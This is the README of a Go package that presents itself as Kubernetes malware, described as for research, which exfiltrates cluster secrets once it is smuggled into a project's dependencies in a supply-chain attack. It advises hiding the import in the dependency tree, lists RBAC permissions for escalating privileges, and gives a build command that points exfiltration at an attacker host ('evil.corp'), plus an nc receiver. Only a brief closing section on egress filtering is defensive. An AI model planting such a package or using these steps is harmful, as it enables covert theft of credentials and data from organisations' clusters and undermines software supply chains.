# STEALTHEXIT

**Rule #1: don't be an idiot.**

This package is Kubernetes malware that exfiltrates sensitive data out of the cluster. This is purely for research and educational purposes. Don't be an idiot.
It is supposed to be delivered via supply chain attack. The prime target are OSS Projects that run inside Kubernetes. Basically everything you can find at [operatorhub.io](https://operatorhub.io/) is a prime target.

### Prerequisites

(1) Run an HTTP server that accepts incoming POST requests. See below on how to configure it.

(2) The victim needs elevated permissions, so we can piggyback on them to fetch and exfiltrate sensitive data. The following permissions can be used to escalate privileges even further:

* create `pod/exec`
* create `pod`, `deployment`, `statefulset`, `daemonset`
* create `secret`
* create `serviceaccount/token`
* create `(Cluster)Role`, `(Cluster)RoleBinding`

### Dropping the Malware

Find a way to import this package. You should hide it well in the dependency tree, so it's not obvious.

```go
package main

import (
    // this is everything
	_ "github.com/moolen/stealthexit"
)
```

Once built and ran the program will immediately push all information to `http://localhost:8087`. This is configurable by adding `ldflags` to the `go build` command when building the victim program, like so:

```sh
$ go build -ldflags "-X github.com/moolen/stealthexit.TargetEndpoint=http://evil.corp"
```

You could also modify it in code, but you shouldn't. Don't be an idiot.

#### Testing

```sh
# start local receiver
$ nc -l -p 8087 > payload

# run victim code
```

---

### Protecting yourself

The supply chain security mechanisms that are considered to be best practices today aren't going to protect you:
1. `SBOM` helps you to find out quicker that you're affected once it's a known malicious package
2. `Provenance` data proofs the origin of the software artefact. Because this package has been accepted upstream it will be legit
3. `vulnerability scan reports` can be attached to an artefact as well. Because it has been accepted upstream the scan reports no issues with this particular package

So what can you do? Egress filtering FTW.
